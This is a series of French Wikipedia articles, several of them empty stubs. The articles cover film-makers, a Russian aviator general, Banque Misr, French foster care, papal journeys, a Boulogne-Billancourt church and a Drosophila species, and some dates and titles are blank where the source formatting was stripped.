<doc id="9622942" url="https://fr.wikipedia.org/wiki?curid=9622942" title="Bahamonde">
Bahamonde



</doc>
<doc id="9622952" url="https://fr.wikipedia.org/wiki?curid=9622952" title="Isotope radiogénique">
Isotope radiogénique



</doc>
<doc id="9622963" url="https://fr.wikipedia.org/wiki?curid=9622963" title="Jonas Pate">
Jonas Pate

Jonas James Pate, né le , est un scénariste, réalisateur et producteur de télévision américain. Il a écrit et réalisé ', "Le Suspect idéal", ' et réalisé "Le Psy d'Hollywood". Il a également cocréé "Good Versus Evil" et "Surface".
Jeunesse.
Jonas Pate naît le en Caroline du Nord. Il est le frère jumeau de Josh Pate. Les frères seront élevés ensemble et ce, même après le divorce de leurs parents alors qu'ils sont enfants. 
Il étudie la philosophie à l'Université de Princeton, où il obtient son diplôme en 1993.
Carrière.
En 1996, Pate commence sa carrière comme scénariste et réalisateur du thriller "". Le film reçoit plusieurs critiques positives après avoir été diffusé au Festival du film de Sundance. L'année suivante, les frères travaillent sur "Le Suspect idéal".
"" créent par la suite l'émission de télévision de fantasy/action "Good Versus Evil" (1999). Par la suite, Jonas Pate réalise plusieurs séries télévisées telles "Battlestar Galactica" (2005), "Bionic Woman" (2007), "Friday Night Lights" (2007-2010), "Chuck" (2008), "The Philanthropist" (2009), "Caprica" (2010), "Undercovers" (2010), "The Event" (2010-2011) et "Suspect numéro un New York" (2011).
Au cinéma, il écrit le scénario de "" (2007), puis, en 2009, il réalise "Le Psy d'Hollywood".
Pate est le réalisateur et le producteur délégué de "". Il est par la suite engagé avec son frère pour scénariser le film indépendant "Way Down South".
Vie personnelle.
Pate est marié à Jennifer Pate. Le couple a deux enfants, Cooper et Lilah, et vit à Los Angeles, Californie.

</doc>
<doc id="9622974" url="https://fr.wikipedia.org/wiki?curid=9622974" title="Viatcheslav Tkatchiov">
Viatcheslav Tkatchiov

Viatcheslav Matveïevitch Tkatchiov ou Tkatchev (en ), né le dans le Kouban et décédé le à Krasnodar, était un général de l’aviation impériale russe, participant à la Première Guerre mondiale et à la guerre civile russe (dans les armées blanches du sud de la Russie).
Formation.
Né dans une famille de Cosaques du Kouban anoblis, Viatcheslav Tkatchiov commence sa formation au corps des cadets de Nijni Novgorod puis, en 1904, choisit de rejoindre l’école d'artillerie Constantin. En il est affecté à la d’artillerie cosaque du Kouban, en 1908 à la . Le il reçoit le rang de sotnik (lieutenant). En il sert à Odessa et y découvre l’aviation. Avec l’accord de ses supérieurs il s’inscrit dans une école d’aviation et y apprend le pilotage dans son temps libre.
En 1911 il reçoit son diplôme de pilote civil de l’aéroclub d’Odessa et est ensuite envoyé à l’école d’aviation d’officiers de Sébastopol dont il sort diplômé fin 1912. Il sert dans diverses unités de l’armée de l’air impériale et effectue en un vol de de Kiev à Ekaterinodar avec un Nieuport IV.
Première Guerre mondiale.
Pour ses vols de reconnaissances Tkatchiov reçoit le l’ordre de Saint-Georges de , le premier aviateur à recevoir cette décoration. Il participe à diverses escarmouches aériennes qui lui serviront pour son manuel « Matériels pour la tactique de combat aérien » (1917). En juin 1917, il est chef du service aérien de la république de Russie et est promu colonel en août.
Guerre civile russe.
En Tkatchiov quitte le quartier général avant la prise de fonctions du bolchévique Krylenko et se rend au front avant de rejoindre le Kouban. Début 1918 il sert comme simple soldat dans le détachement blanc du colonel Kouznetsov, luttant contre la République soviétique nord-caucasienne. Ce détachement est chargé de couvrir la traversée du Kouban par les forces commandées par Viktor Pokrovski et se trouve finalement encerclé par l’ennemi. Tkatchiov est capturé et retenu à la prison de Maïkop de mars à . Début septembre Maïkop est libérée des rouges et Tkatchiov se met au service de la République populaire du Kouban. Celle-ci ne disposant pas d'aviation Viatcheslav Tkatchiov est envoyé en mission auprès du hetman Pavlo Skoropadsky. De retour à Ekaterinodar il dispose de quelques avions et forme le d’aviation du Kouban. Il appuie l’Armée du Caucase du général Wrangel lors des combats contre la bolchévique.
Le il est promu général major et commande l’aviation de l’armée du Kouban. En 1920 il prend le commandement de l’aviation des Forces Armées du Sud de la Russie.
Exil.
Après la défaite des armées blanches s’installe dans le Royaume des Serbes, Croates et Slovènes et participe activement aux efforts de l’Union générale des combattants russes. En 1941 il prend part à la formation du Corps Russe avant de prendre ses distances avec l’occupant nazi et les organisations collaboratrices.
Union Soviétique.
En 1944 Tkatchiov refuse de quitter Belgrade devant l’avancée de l’armée rouge et est fait prisonnier le . Transféré à Moscou il est jugé et condamné à 10 ans de goulag. Libéré en 1955 il s’installe dans le Kouban où il décède dix ans plus tard.

</doc>
<doc id="9622999" url="https://fr.wikipedia.org/wiki?curid=9622999" title="Ermakov">
Ermakov

Ermakov, Yermakov ou Iermakov (en ), au féminin Ermakova, Yermakova ou Iermakova (), est un nom propre d'origine russe qui peut faire référence à : 

</doc>
<doc id="9623000" url="https://fr.wikipedia.org/wiki?curid=9623000" title="Yermakov">
Yermakov



</doc>
<doc id="9623001" url="https://fr.wikipedia.org/wiki?curid=9623001" title="Festival du film de Boston">
Festival du film de Boston

Le festival du film de Boston ("Boston Film Festival", BFF) est un festival annuel du film qui a eu lieu à Boston dans l'État américain du Massachusetts. Il a lieu chaque année depuis 1984, généralement au début du mois de septembre.

</doc>
<doc id="9623004" url="https://fr.wikipedia.org/wiki?curid=9623004" title="Iermakov">
Iermakov



</doc>
<doc id="9623005" url="https://fr.wikipedia.org/wiki?curid=9623005" title="Ermakova">
Ermakova



</doc>
<doc id="9623006" url="https://fr.wikipedia.org/wiki?curid=9623006" title="James B. Lowe">
James B. Lowe

James B. Lowe est un acteur américain né le à Macon, Géorgie (États-Unis), décédé le à Los Angeles (Californie).

</doc>
<doc id="9623007" url="https://fr.wikipedia.org/wiki?curid=9623007" title="Yermakova">
Yermakova



</doc>
<doc id="9623008" url="https://fr.wikipedia.org/wiki?curid=9623008" title="Boston Film Festival">
Boston Film Festival



</doc>
<doc id="9623009" url="https://fr.wikipedia.org/wiki?curid=9623009" title="Iermakova">
Iermakova



</doc>
<doc id="9623010" url="https://fr.wikipedia.org/wiki?curid=9623010" title="Banque Misr">
Banque Misr

La Banque Misr (en arabe : بنك مصر) est une banque égyptienne cofondée par l'industriel Joseph Aslan Cattaui Pacha et l'économiste Talaat Harb en 1920. Le gouvernement de la République arabe unie a nationalisé la banque en 1960. La banque possède des succursales dans tous les gouvernorats d'Égypte, ainsi que des bureaux de change et des bureaux de permis de travail pour les travailleurs étrangers en Égypte.
Histoire.
L'idée d'une banque nationale d'Égypte remonte au moins à l'époque de Méhémet Ali, qui ordonna la création d'une banque dotée de 700 000 riyals peu avant sa maladie et sa mort. Amin Shumayyil écrivit un article en faveur de cette idée le 26 avril 1879 dans le journal Al-Tijara. Bien que plusieurs dignitaires égyptiens se soient réunis pour discuter du projet, le conflit entre le khédive Ismaïl Pacha et l'Assemblée nationale, puis la révolte d'Urabi, condamnèrent cette fois le projet à l'échec. Wilfrid Scawen Blunt, ami du chef de la révolte Ahmed Urabi, rapporte dans ses mémoires qu'Urabi avait imaginé une « banque de crédit » pour les agriculteurs.
Joseph Cattaui et Talaat Harb cofondèrent la Banque Misr en 1920. Talaat avait publié des ouvrages en 1907 et 1911 appelant à la création d'une banque nationale financée par l'Égypte. (La Banque nationale d'Égypte était détenue par des Britanniques, et toutes les autres banques égyptiennes étaient détenues par des étrangers.) Harb calqua les opérations de la Banque Misr sur celles de la Deutsche Orientbank, qu'il connaissait grâce à son amitié avec le propriétaire d'une banque juive séfarade.
En 1926-1927, la Banque Misr créa sa première filiale étrangère, la Banque Misr-France, pour servir les touristes égyptiens en France. Son bureau parisien était situé au 101-103 rue des Petits-Champs, aujourd'hui 33-35 rue Danielle Casanova, et son siège social était situé de l'autre côté du pâté de maisons, au 24 place Vendôme. Quatre ans plus tard, la Banque Misr fusionna avec la Banque Essadine, au Liban, pour former la coentreprise Banque Misr-Syrie-Liban. Cette banque absorba ensuite la Banque Ezzeddine &amp; Adib (Izz al-Din) à Tripoli.
En 1971, la Banque Misr a absorbé la Banque de Port-Saïd. Cette dernière avait été créée en 1960 pour regrouper les opérations égyptiennes de plusieurs banques étrangères, dont la Banque belge et internationale en Égypte et la Banque de Tokyo. En 1964, elle a également absorbé la Banque Al-Goumhouria, qui avait repris en 1956 les opérations égyptiennes de la Banque ionienne et de la Banque ottomane.
En mars 2017, la Banque Misr a lancé ses services bancaires en ligne pour le paiement électronique sur mobile. Le Wallet permet de déposer et de retirer de l'argent sur des comptes, de transférer de l'argent d'un compte à un autre, de payer des factures de services publics, de débiter le solde d'une entreprise, de faire des dons, de payer des amendes, de recevoir des virements et de régler des achats auprès de commerçants agréés.
Le 6 avril 2021, le Cabinet saoudien a autorisé la Banque Misr à ouvrir une succursale en Arabie saoudite.

</doc>
<doc id="9623012" url="https://fr.wikipedia.org/wiki?curid=9623012" title="Prix Heinrich Böll">
Prix Heinrich Böll



</doc>
<doc id="9623019" url="https://fr.wikipedia.org/wiki?curid=9623019" title="Christine af Bro">
Christine af Bro

Le Christine af Bro est une réplique de "", navire utilisé au transport dans les canaux néerlandais du au .
Son port d'attache actuel est Kristinehamn dans le Comté de Värmland en Suède.
Histoire.
Le "Christine af Bro" a été construit de 1997 à 2005 à Kristinehamn dans le cadre d'un projet culturel européen. Ce Bojort moderne a été réalisé grâce à un partenariat de nombreuses entreprises, associations et particuliers au sein de l'association "Christine af Bro". 
Il a été construit dans la pure tradition de la construction navale néerlandaise de l'époque. Le lancement du bâtiment a eu lieu le et son voyage inaugural le .
En 2008, 12 places ont été aménagées pour recevoir des passagers en nuitée, dans un décor d'époque.
Le "Christine af Bro" est désormais le bâtiment ambassadeur de la ville de Kristinehamn qui fut la ville principale de transport maritime et fluvial durant près de trois siècles. 
Il propose des croisières à la journée et il peut être affrété pour des événements particuliers.
Le "Christine af Bro" a participé à Brest 2008 ("Fêtes maritimes de Brest") 

</doc>
<doc id="9623020" url="https://fr.wikipedia.org/wiki?curid=9623020" title="Louis d’Arpajon">
Louis d’Arpajon



</doc>
<doc id="9623035" url="https://fr.wikipedia.org/wiki?curid=9623035" title="Jacques-Louis Bance">
Jacques-Louis Bance

Louis Jacques Bance, dit Bance aîné, né le à Claville et mort le à Paris , est un dessinateur, graveur, éditeur et marchand d'estampes français.
Biographie.
Fils d'un père ouvrier agricole, Jacques-Louis Bance a un frère, Charles Bance, dit « Bance jeune ».
Lorsqu'il devient orphelin à 9 ans, on le place en apprentissage chez un maître sellier d'Évreux. Il travaille en Normandie comme compagnon sellier avant de s'installer à Paris en 1787 comme maître sellier.
Il s'intéresse à la gravure en 1789 et réalise en particulier des scènes historiques. Il devient éditeur et marchand d'estampes. Afin d'exporter les estampes, il invente un système permettant de les transporter sous verre ; le secret de fabrication demeure. À partir de 1803, il produit des estampes colorisées parfois satiriques, avec la complicité de Louis Le Coeur.
Il se spécialise dans l'édition de livres à figures ainsi que dans les périodiques d'architecture, comme "Études relatives a l'art des constructions" (1823-1828). Il s'associe de 1831 à 1846 à son fils Balthazar Bance (1804-1862) sous la raison « Bance aîné et successeur ».
Il devient le beau-frère du géographe Jean-Denis Barbié du Bocage en février 1792 puis le beau-père du marchand d'estampes Jean-Baptiste Caillard (1776-1833).
À sa mort, en 1847, son fils lui succède dans son affaire, en association avec son oncle Charles.
Son corps repose dans un petit monument funéraire, au cimetière du Père-Lachaise ( division) à Paris, avec une inscription : « Bienfaiteur de Claville ».
Œuvre.
Jacques-Louis Bance est actif de 1789 à 1846, peu avant sa mort. Il réalise surtout des dessins et des gravures à l'eau-forte et au burin sur des thèmes symbolistes patriotiques.
Il a édité de nombreuses estampes, notamment une version de l’Acte constitutionnel en 1798, dessiné par Alexandre-Évariste Fragonard et gravé par Louis-François Mariage (mise en forme et images) et Dien (graveur en lettres) et la "Déclaration des droits de l'homme et du citoyen de 1789" entre 1789 et 1792.

</doc>
<doc id="9623039" url="https://fr.wikipedia.org/wiki?curid=9623039" title="Igor Kvacha">
Igor Kvacha

Igor Vladimirovitch Kvacha (en ), né le à Moscou et mort le dans la même ville, est un acteur soviétique de théâtre et cinéma. Il travaille aussi dans le doublage des films et comme animateur de radio. Il est distingué artiste émérite en 1968 et artiste du Peuple de la RSFS de Russie en 1978.
Biographie.
Le père d'Igor, doktor nauk en génie chimique Vladimir Ilitch Kvacha est le professeur de l'Université de technologie chimique Dmitri Mendeleïev de Moscou. Il périt le sur le front de Leningrad. La mère, Dora Zakharovna Kvacha, est orthophoniste spécialisée en prise en charge des enfants sourds.
Kvacha est diplômé de l'École-studio du Théâtre d'Art académique de Moscou en 1955 et devient acteur du Théâtre d'art de Moscou, qu'il quitte pour le Théâtre Sovremennik en 1957.
Sa carrière cinématographique commence en 1956, mais la vrai popularité lui vient avec le rôle de bourgmestre dans le film "Ce même Münchausen" de Mark Zakharov en 1979.
Au début des années 1990, il fait régulièrement partie du jury du jeu télévisé humoristique "KVN". Depuis 1998, il anime l'émission "Attends-moi" («Жди меня») sur Perviy Kanal.
Son livre de mémoires "Point de retour" («Точка возврата») parait en 2007. En 2008, toujours sur Perviy Kanal il presente l'émission "Les incroyables histoires sur la vie" («Невероятные истории про жизнь»).
Souffrant d'une broncho-pneumopathie chronique obstructive, l'artiste meurt des suites d'une bronchite infectieuse le . La cérémonie d'adieux est organisée dans la grande salle de Sovremennik. Kvacha est inhumé au cimetière Troïekourovskoïe.

</doc>
<doc id="9623040" url="https://fr.wikipedia.org/wiki?curid=9623040" title="Assistant familial">
Assistant familial

L'assistant familial est une profession définie et réglementée en France, souvent désignée sous le terme de "famille d'accueil". C'est l'activité d'accueil et d'hébergement de mineurs placés dans le cadre de l'aide sociale à l'enfance. Ce mode d'accueil existe conjointement avec l'accueil dans un foyer d'enfants, c'est-à-dire en structure collective. Il consiste à accueillir à son domicile (décret du ) des jeunes, au nombre de trois maximum et ayant 21 ans pour les plus âgés, afin de veiller à leurs besoins fondamentaux, assurer leur accompagnement éducatif et le maintien des liens avec la famille naturelle, au sein d'une équipe pluridisciplinaire. Un agrément, préalable obligatoire à l'embauche, est délivré par les services de la Protection Maternelle et Infantile (PMI).
Sociologie.
Un rapport de l'Inspection Général des Affaires Sociales (IGAS) de 2013 précise que l’accueil familial concerne « plus de enfants confiés [...et] repose sur environ assistants familiaux ».
Malgré une tendance récente au recrutement d'hommes, la profession reste essentiellement exercée par des femmes, âgées en moyenne de 40 ans et plus.
Ces professionnels sont très majoritairement « employés par les services Aide Sociale à l’Enfance (ASE) des Conseils Généraux. Ils peuvent aussi être salariés de services de placement familial publics ou privés (souvent des associations) » (Paris, 2015).
Histoire.
Les réformes législatives successives ont visé une sécurisation d'un métier estimé précaire, ainsi qu'une professionnalisation des pratiques de l'accueil familial et une réelle inscription de ces professionnels dans le travail des équipes pluridisciplinaires de placement.
Même si l'histoire de cette profession a débuté il y a plusieurs siècles, la naissance du statut a commencé en 1977 puis au travers de la loi de 1992, puis la loi 2005-706 du suivie de l’arrêté du (Légifrance, 2015) « ont formalisé l’évolution du statut, du rôle et des compétences des praticiens qu’on appelle communément « les familles d’accueil » (Paris, 2015). -source ufnafaam-
Depuis la loi 2005, les Assistants Familiaux effectuent un stage de 60 heures avant tout premier accueil d'enfant ou de jeune. Puis, dans les 3 ans qui suivent leur embauche par un service de placement, ils suivent une formation théorique de 240 heures (en moyenne 2 jours par mois durant 18 mois).
Aucun diplôme n'est nécessaire pour exercer le métier. Au terme des 240 heures de formation théorique, les Assistants Familiaux peuvent toutefois se présenter aux épreuves du Diplôme d'État Assistant Familial (DEAF) de niveau V. Une fois diplômés, les titulaires sont exonérés du renouvellement d'agrément, prévu tous les 5 ans pour les non-diplômés.

</doc>
<doc id="9623042" url="https://fr.wikipedia.org/wiki?curid=9623042" title="Festival international du film de Boston">
Festival international du film de Boston

Le Festival international du film de Boston ("Boston International Film Festival") est un festival du cinéma indépendant qui a lieu à Boston, Massachusetts, aux États-Unis, et qui présente plus de 90 films par an.
Le festival a été fondé en 2003 par le producteur Patrick Jerome et se tient généralement en avril.

</doc>
<doc id="9623054" url="https://fr.wikipedia.org/wiki?curid=9623054" title="Église Sainte-Cécile de Boulogne-Billancourt">
Église Sainte-Cécile de Boulogne-Billancourt

L'église Sainte-Cécile est une église paroissiale catholique située à Boulogne-Billancourt dans les Hauts-de-Seine et dépendant du diocèse de Nanterre, aux portes de Paris. Elle est administrée depuis 1992 par les pères de la Communauté Saint-Jean. Ils y ont ouvert un prieuré, le prieuré Sainte-Geneviève, qui propose des sessions de formation et des veillées spirituelles.
Historique et architecture.
Une simple chapelle de patronage est d'abord érigée sous le vocable de l'Enfant-Jésus à cet emplacement. L'église actuelle de style néo-classique, élevée sur une vaste crypte, se compose d'une nef centrale séparée des bas-côtés par des colonnes toscanes et éclairée par de nombreux oculus. Elle est dédiée à sainte Cécile, patronne des musiciens, dont une statue de bois tenant une lyre orne le bas-côté droit. Elle est devenue église paroissiale en 1963 et a été restaurée en 1965. Le père Jean-Philippe Chauveau y a été vicaire.
La paroisse Sainte-Cécile est l'une des quatre paroisses catholiques de Boulogne-Billancourt, avec la paroisse Notre-Dame, la paroisse de l'Immaculée-Conception et la paroisse Sainte-Thérèse-de-l'Enfant-Jésus.
Adresse.
44 rue de l'Est, 92100 Boulogne-Billancourt. Métro Boulogne-Jean Jaurès (ligne 10).
Clocher et cloches.
Jusqu’en 2021, l’église ne possédait pas de cloches en raison de l’absence de clocher. Dans le but de réinscrire cette église comme église de quartier, d’importants travaux sont engagés en 2020-2021. Ceci passe notamment par l’édification d’un nouveau clocher surplombant l’édifice.
Trois cloches neuves, fondues par la fonderie Voegelé-Bollée de Strasbourg sont bénies le lundi 5 avril 2021 (lundi de Pâques) par Monseigneur Rougé, évêque de Nanterre ; le clocher est inauguré le 22 janvier 2023 en présence de Mgr Rougé.
Depuis 1993, la paroisse Sainte Cécile est une paroisse autonome confiée aux Frères de la Congrégation Saint-Jean.

</doc>
<doc id="9623065" url="https://fr.wikipedia.org/wiki?curid=9623065" title="Visites pastorales pontificales">
Visites pastorales pontificales

Les visites pastorales pontificales et leurs déplacements en dehors de Rome ont été historiquement rares, voire pour les 500 premières années quasiment inexistantes. Le pape Paul VI fut le premier à effectuer des visites pastorales sur plusieurs continents et Jean-Paul II (1978-2005) entreprit davantage de voyages que tous ses prédécesseurs cumulés.
Au , les papes résidaient principalement en dehors de Rome – Viterbe, Orvieto et Pérouse – puis à Avignon (1309-1378). Le pape Vigile (537-555) en 547, le pape Agathon (678-681) en 680, et le pape Constantin en 710 ont visité Constantinople, alors que le pape Martin (649-653) est enlevé et est jugé en 653 dans la capitale byzantine. Étienne II (752 -757) est le premier pape à traverser les Alpes en 752 pour couronner Pépin le Bref ; le pape Pie VII a réitéré ce voyage plus d'un millénaire plus tard, pour couronner .
Voyages avant le concile Vatican II.
Dans l'Empire romain, en Italie et conclaves.
Clément I est exilé à Chersonèse (Tauride) par l'empereur romain Trajan, puis y est martyrisé, selon des récits apocryphes datés d'environ 99. Pontien (230-235) meurt en exil en Sardaigne, mais il avait démissionné du trône pontifical avant de quitter Rome. Le pape Corneille (251-253) meurt après un an d'exil à Civitavecchia, à 80 km de Rome. Le pape Libère (352-366) est exilé à Bérée, en Thrace, par l'empereur romain Constance II. Le pape Jean I (523-526) est le premier pape à voyager volontairement en dehors de Rome, naviguant vers Constantinople en 523.
Clément II (1046-1047) est le premier pape à être consacré en dehors de Rome. Urbain II (1088-1099) est devenu le premier pape à voyager plusieurs fois en dehors de Rome ; élu à Terracina, Urbain II a organisé des synodes à Amalfi, Bénévent et Troia. Il prêche la première croisade au concile de Clermont (1095), à Clermont-Ferrand. Avant cela, le pape Léon IX (1049-1054) avait traversé les Alpes. Quant à Léon III (795-816), après avoir été la cible d'un attentat en 799, il se réfugie à Paderborn (Saxe) auprès de Charlemagne.
Bien que les conclaves se soient parfois déroulés en dehors de Rome, seules six élections depuis 1455 ont été organisés hors de l'enceinte du palais du Vatican, vingt-huit élections papales ont eu lieu en dehors de Rome : Terracina (1088), Cluny (1119), Velletri (1181), Vérone (1185), Ferrare (), Pise (), Pérouse (1216, 1264 à 1265, 1285, de 1292 à 1294, de 1304 à 1305), Anagni (1243), Naples (1254, 1294), Viterbe (1261, 1268-1271, , août-, 1277, 1281-1282), Arezzo (), Carpentras / Lyon (1314 à 1316), Avignon (1334, 1342, 1352, 1362, 1370), Constance (1417) et de Venise (de 1799 à 1800).
En dehors d'Italie, en Europe.
Avant Paul VI, aucun pape ne voyage hors d'Europe. 
Jean (523-526) en 523 (en tant que délégué de Théodoric le Grand), Vigile (537-555) en 547 (appelé par Justinien pour tenir compte de son refus de signer les canons du concile de Chalcédoine), Agathon (678-681) en 680 (pour assister au troisième concile de Constantinople), et Constantin en 710 (appelé par Justinien II) visitent Constantinople, alors que le pape Martin (649-653) est enlevé et y jugé à l'issue du concile de Latran en 649. Constantin est le dernier pape à visiter Constantinople jusqu'au pape Paul VI l'a fait à nouveau en 1967.
Étienne II (752-757) est le premier pape à traverser les Alpes en 752 pour couronner Pépin le Bref, à Saint-Denis. Cela fait de lui le premier pape à visiter le royaume franc. En 816, Étienne IV se rend à Reims pour le couronnement du roi Louis le Pieux. Jean VIII (872-882) visite la France en 878, et Léon IX (1049-1054) passe en France le . Le prochain pape à entrer en France est le pape Urbain II (1088 à 1099), qui s'arrête à Valence et au Puy sur son chemin pour le concile de Clermont (1095). Fin 1106, Pascal II se rend en France pour chercher la médiation du roi dans le contexte de la querelle des Investitures. En 1118, en fuite pour chercher la protection du roi le Gros, Gélase II meurt à l'abbaye de Cluny, où il est enterré. En 1119, Calixte II est élu pape au même endroit puis en 1131 Innocent II, dans un contexte schismatique, pérégrine en France et sacre Louis VII à Reims. En 1163, réfugié en France, Alexandre III vient à Paris poser la première pierre de la cathédrale Notre-Dame. En 1367, Urbain V se rend à Montpellier.
Benoît VIII (1012-1024) visite Bamberg le ; aucun pape n'avait visité les frontières de l'Allemagne moderne depuis 150 ans. Léon IX (1049-1054) a également voyagé à travers les frontières modernes de l'Allemagne. Probablement la dernière visite d'un pape dans le Saint-Empire date de 1782, lorsque Pie VI est reçu par l'empereur Joseph II, à Vienne et à Munich.
Voyages depuis les années 1960.
Le pape Paul VI fut le premier à voyager à bord d'un avion, le premier à se déplacer hors d'Italie depuis 1809 et le premier à se rendre en Amérique, en Afrique, en Asie et en Océanie dans le cadre de son pontificat.
Le pape Jean-Paul II a davantage voyagé en tant que pape que tous ses prédécesseurs réunis (il a parcouru environ 721 052 miles, soit l'équivalent d'environ 31 tours de la Terre).

</doc>
<doc id="9623069" url="https://fr.wikipedia.org/wiki?curid=9623069" title="Arbres têtards">
Arbres têtards



</doc>
<doc id="9623078" url="https://fr.wikipedia.org/wiki?curid=9623078" title="Crétacé moyen">
Crétacé moyen

Le « Crétacé moyen » est une subdivision obsolète de l'échelle des temps géologiques au sein de la période géologique du Crétacé, dernière période de l'ère du Mésozoïque ou Secondaire. Le Crétacé est aujourd'hui subdivisé en deux sous-ensembles : le Crétacé supérieur et le Crétacé inférieur.
Dans la charte stratigraphique internationale, cette ancienne subdivision (dont la définition a été progressive au cours du temps), correspond à un intervalle de temps incluant 5 étages du Crétacé.
Du plus récent au plus ancien :
Dans l'ancienne terminologie le « Crétacé moyen » était précédé par le Néocomien et suivi par le Sénonien, deux subdivisions aujourd'hui également obsolètes.

</doc>
<doc id="9623086" url="https://fr.wikipedia.org/wiki?curid=9623086" title="Shanghanlun">
Shanghanlun



</doc>
<doc id="9623094" url="https://fr.wikipedia.org/wiki?curid=9623094" title="Festival du film indépendant de Boston">
Festival du film indépendant de Boston



</doc>
<doc id="9623095" url="https://fr.wikipedia.org/wiki?curid=9623095" title="Grace Lynn Kung">
Grace Lynn Kung

Grace Lynn Kung, née en 1987 à Ottawa, est une actrice canadienne.

</doc>
<doc id="9623097" url="https://fr.wikipedia.org/wiki?curid=9623097" title="Sergeï Obraztsov">
Sergeï Obraztsov



</doc>
<doc id="9623103" url="https://fr.wikipedia.org/wiki?curid=9623103" title="Grace Kung">
Grace Kung



</doc>
<doc id="9623104" url="https://fr.wikipedia.org/wiki?curid=9623104" title="Obraztsov">
Obraztsov

Patronymes.
Obraztsov ("masculin" ; ) ou Obraztsova ("féminin" ; ) est un patronyme russe porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="9623113" url="https://fr.wikipedia.org/wiki?curid=9623113" title="Zhang Zhongjing">
Zhang Zhongjing

Zhang Zhongjing () (né en 150 dans la (actuellement Dengzhou dans la province du Henan, et décédé en 219), nom officiel Zhang Ji () et prénom social, Zhong Jing () est un médecin de l'époque des Han, dont il a été un des plus éminents médecins dans les dernières années de la dynastie. Il a établi des principes de médication et a résumé l'ensemble des connaissances médicales issues de la pratique de cette époque, apportant ainsi une contribution majeure à la médecine traditionnelle chinoise.
Biographie.
Bien qu'il soit bien connu dans la médecine chinoise moderne, et qu'il soit considéré comme l'un des plus grands médecins chinois de l'Histoire, on connait bien peu de choses sur sa vie. Il est par exemple absent du Livre des Han, mais la préface du Zhenjiu jiayi jing (ABC classique d’acupuncture et de moxibustion) rédigé par le médecin Huangfu Mi (215-282) le cite à plusieurs reprises. Pour une liste de sources concernant la vie de Zhang Zhongjing, on peut notamment se reporter à la biographie rédigée par Hsu Hong-yen (1917-1991).
Selon certaines sources tardives, il serait né à Nanyang, dans le Henan ; il aurait occupé un poste officiel à Changsha et aurait vécu de 150 jusqu'à 219 environ. Les dates exactes concernant sa naissance, sa mort, et ses œuvres varient, mais on admet généralement la date de 220 comme limite supérieure.
À son époque, alors que les seigneurs de la guerre guerroient pour le contrôle de leurs territoires, beaucoup de gens sont atteints par des maladies infectieuses, et la famille de Zhang Zhongjing ne fait pas exception. Il apprend alors la médecine auprès de Zhang Bozu, son camarade puis son maître, en se plongeant dans la littérature médicale déjà existante, comme le "Huangdi Neijing" (/), le "Classique interne de l'Empereur jaune", et en rassemblant ailleurs de nombreuses ordonnances, pour finalement écrire le maître ouvrage qu'est le "Shanghan Zabing Lun" (littéralement, le "Traité sur la pathologie du froid et maladies diverses"). Peu après sa publication, le livre est perdu au cours des guerres qui ravagent la Chine pendant la période des Trois Royaumes. Du fait de sa contribution à la médecine chinoise traditionnelle, Zhang Zhongjing est souvent considéré comme le sage de la médecine chinoise, notamment du fait de son apport à la pharmacopée et au diagnostic par les pouls.

</doc>
<doc id="9623119" url="https://fr.wikipedia.org/wiki?curid=9623119" title="Drosophila santomea">
Drosophila santomea

Drosophila santomea est une espèce d'insectes diptères de la famille des Drosophilidae. Cette mouche appartient au même sous-groupe que "Drosophila melanogaster".
"Drosophila santomea" est endémique de l'ile volcanique de Sao Tomé où elle s'hybride avec "Drosophila yakuba" ; la divergence entre ces deux espèces sœurs est d'environ 0,5/1 million d'années.
Génétique de l'évolution morphologique et comportementale.
Comme les autres espèces du sous-groupe, "D. santomea" a fait l'objet de nombreuses études génétiques comparatives avec "D. yakuba" son groupe frère. Bien que très proches génétiquement, ces deux espèces montrent des différences morphologiques au niveau de la pigmentation de leur abdomen et la forme de leur appendices sexuels. Des différences de comportement ont également été observées, notamment dans le comportement de parade nuptiale. Des travaux récents ont permis d'identifier les régions chromosomiques et même les gènes impliqués dans ces différences morphologiques et comportementales.
Classification.
L'espèce "Drosophila santomea" a été décrite en 2000 par (1947-2006) et dans une publication coécrite avec , , et .
Étymologie.
Son épithète spécifique, "santomea", fait référence à sa localité type, l'île volcanique de Sao Tomé.

</doc>
<doc id="9623126" url="https://fr.wikipedia.org/wiki?curid=9623126" title="Marionnettiste">
Marionnettiste



</doc>
<doc id="9623128" url="https://fr.wikipedia.org/wiki?curid=9623128" title="Hochschule Worms">
Hochschule Worms

Luniversité de sciences appliquées de Worms (en ) est une haute école d'orientation économique-technique localisée à Worms, en Rhénanie-Palatinat.
Pour les 3200 étudiants il y a 100 professeurs d'université et 66 chargés de cours qui offrent des études dans 15 sections de la gestion et de l'organisation des entreprises et 5 sections techniques. 
L'université se trouve à l'ouest du centre-ville sur un petit campus. Entretemps le campus s'est étendu en ajoutant un territoire autrefois utilisé par les Américains.
Spécialités.
L'université offre des cours en informatique, touristique/transports et sciences économiques.
Administration.
Il y a une charge de curateur (13 membres) et un conseil de l'université (10 membres).

</doc>
<doc id="9623140" url="https://fr.wikipedia.org/wiki?curid=9623140" title="Mirman">
Mirman

Mirman est un nom de famille, notamment porté par :

</doc>
<doc id="9623153" url="https://fr.wikipedia.org/wiki?curid=9623153" title="Robert Schimmel">
Robert Schimmel

Robert Schimmel est un acteur et scénariste américain né à New York le et mort à Scottsdale le .

</doc>
<doc id="9623163" url="https://fr.wikipedia.org/wiki?curid=9623163" title="143 Records">
143 Records

143 Records est une société d'édition de disques américaine du producteur David Foster.
Les chiffres 1-4-3 sont dérivés des mots "I love you.".
Histoire.
Le producteur David Foster a signé un contrat avec Warner en 1995, ce qui lui a permis de créer son propre label .
Un des premiers artistes à signer était les Corrs.

</doc>
<doc id="9623164" url="https://fr.wikipedia.org/wiki?curid=9623164" title="Aire sous la courbe">
Aire sous la courbe



</doc>
<doc id="9623169" url="https://fr.wikipedia.org/wiki?curid=9623169" title="Fracture du col du fémur">
Fracture du col du fémur



</doc>
<doc id="9623174" url="https://fr.wikipedia.org/wiki?curid=9623174" title="Membibre de la Hoz">
Membibre de la Hoz

Membibre de la Hoz est une commune de la province de Ségovie dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9623176" url="https://fr.wikipedia.org/wiki?curid=9623176" title="Charles Lucet">
Charles Lucet

Charles Ernest Lucet, né le à Paris où il est mort le , est un diplomate français.
Il a été ambassadeur de France aux États-Unis. 
Il est le père de Jean-Louis Lucet né en .

</doc>
<doc id="9623186" url="https://fr.wikipedia.org/wiki?curid=9623186" title="Michael Corrente">
Michael Corrente

